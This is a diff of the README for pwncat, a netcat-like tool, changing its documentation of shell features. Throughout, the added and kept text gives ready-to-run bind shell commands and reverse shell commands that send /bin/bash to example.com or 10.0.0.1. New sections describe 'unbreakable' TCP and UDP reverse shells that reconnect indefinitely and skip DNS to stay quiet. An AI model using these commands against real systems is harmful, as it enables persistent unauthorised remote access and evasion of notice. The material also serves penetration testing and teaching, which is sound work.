@@ -172,16 +172,16 @@ chmod +x pwncat
 
 ### Summon shells
 ```bash
-# Bind shell
-pwncat -l -e '/bin/bash' 8080
+# Bind shell (accepts new clients after disconnect)
+pwncat -l -e '/bin/bash' 8080 -k
 ```
 ```bash
-# Reverse shell (Ctrl+c proof)
-pwncat -e '/bin/bash' example.com 4444 --recon -1 --recon-wait 10
+# Reverse shell (Ctrl+c proof: reconnects back to you)
+pwncat -e '/bin/bash' example.com 4444 --recon -1 --recon-wait 1
 ```
 ```bash
-# Reverse UDP shell (Ctrl+c proof)
-pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 10
+# Reverse UDP shell (Ctrl+c proof: reconnects back to you)
+pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1
 ```
 
 ### Local port forward `-L` (listening proxy)
@@ -195,7 +195,7 @@ pwncat -L 0.0.0.0:5000 everythingcli.org 3306
 pwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u
 ```
 
-### Remote port forward `-R` (double client Proxy)
+### Remote port forward `-R` (double client proxy)
 ```bash
 # Connect to Remote MySQL server (remote port 3306) and then connect to another
 # pwncat/netcat server on 10.0.0.1:4444 and bridge traffic
@@ -275,10 +275,9 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 Like the original implementation of `netcat`, when using **TCP**, `pwncat`
 (in client and listen mode) will automatically quit, if the network connection has been terminated,
 properly or improperly.
-
 In case the remote peer does not terminate the connection, or in **UDP** mode, `pwncat` will stay open.
 
-Have a look at the following illustratoins to better understand the behaviour:
+Have a look at the following commands to better understand this behaviour:
 
 ```bash
 # [Valid HTTP request] Does not quit, web server keeps connection intact
@@ -309,7 +308,7 @@ pwncat -u localhost 4444 < input.txt
 ```
 
 There are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)
-section for more advanced adjustments.
+section for more advanced settings.
 
 
 ## :closed_book: Documentation
@@ -583,33 +582,61 @@ stty rows <num> columns <cols>   # <num> and <cols> values found above by 'stty 
 ```
 > <sup>[1] [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)</sup>
 
-<!--
-</details>
--->
+
+### UDP reverse shell
+Without tricks a UDP reverse shell is not really possible. UDP is a stateless protocol compared to TCP and does not have a `connect()` method as TCP does.
+In TCP mode, the server will know the client IP and port, once the client issues a `connects()`.
+In UDP mode, as there is no `connect()`, the client simply sends data to an address/port without having to connect first.
+Therefore, in UDP mode, the server will not be able to know the IP and port of the client and hence, cannot send data to it first.
+The only way to make this possible is to have the client send some sort of data to the server first, so that the server can see what IP/port has sent data to it.
+
+`pwncat` emulates the TCP `connect()` by having the client send a null byte to the server once or periodically via `--ping-intvl` or `--ping-init`.
+
+```bash
+# The client
+# --exec            # Provide this executable
+# --udp             # Use UDP mode
+# --ping-init       # Send an initial null byte to the server
+pwncat --exec /bin/bash --udp --ping-init 10.0.0.1 4444
+```
+
+
+### Unbreakable TCP reverse shell
+Why unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.
+In other words, the client will keep trying to connect to the specified server until success. If the connection is interrupted, it will keep trying again.
+```bash
+# The client
+# --exec            # Provide this executable
+# --nodns           # Keep the noise down and don't resolve hostnames
+# --reconn          # Automatically reconnect back to you indefinitely
+# --reconn-wait     # If connection is lost, connect back to you every 2 seconds
+
+pwncat --exec /bin/bash --nodns --reconn -1 --reconn-wait 2 10.0.0.1 4444
+```
 
 ### Unbreakable UDP reverse shell
-
-<!--
-<details>
-  <summary>Click to expand</summary>
--->
-
-Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.
+Why unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.
+In other words, the client will keep sending null bytes to the server to constantly announce itself.
 ```bash
 # The client
 # --exec            # Provide this executable
 # --nodns           # Keep the noise down and don't resolve hostnames
 # --udp             # Use UDP mode
-# --ping-intvl      # Ping the server every 10 seconds
+# --ping-intvl      # Ping the server every 2 seconds
 
-pwncat --exec /bin/bash --nodns --udp --ping-intvl 10 10.0.0.1 4444
+pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 ```
-If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
+
+### Logging
+
+> **Note:** Ensure you have a reverse shell that keeps coming back to you. This way you can always change your logging settings without loosing the shell.
+
+If you feel like, you can start a listener in full TRACE logging mode to figure out what's going on or simply to troubleshoot.
 ```bash
 # The server
-# -u   # Use UDP mode
+# -v   # The logging level
 # -l   # Listen for incoming connections
-pwncat -u -l -vvvvv
+pwncat -vvvv -l
 ```
 You will see (among all the gibberish) a TRACE message:
 ```
@@ -620,18 +647,19 @@ All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>
 your server and start it again in silent mode:
 ```bash
 # The server
-pwncat -u -l -vvvvv
+pwncat -l
 ```
-Now wait a maximum of 10 seconds and you can issue commands.
-Having no info messages at all, is also troublesome. You might want to know what is going
+Now wait a maximum a few seconds, depending at what interval the client comes back to you and voila, your session is now again without logs.
+
+Having no info messages at all, is also sometimes not desirable. You might want to know what is going
 on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
 the notifications to a logfile:
 ```bash
 # The server
 # 2> comm.txt   # This redirects the messages to a logfile instead
-pwncat -u -l -vvv 2> comm.txt
+pwncat -l -vvv 2> comm.txt
 ```
-Now all you'll see in your server window are the actual command inputs and outputs.
+Now all you'll see in your terminal session are the actual command inputs and outputs.
 If you want to see what's going on behind the scene, open a second terminal window and tail
 the `comm.txt` file:
 ```
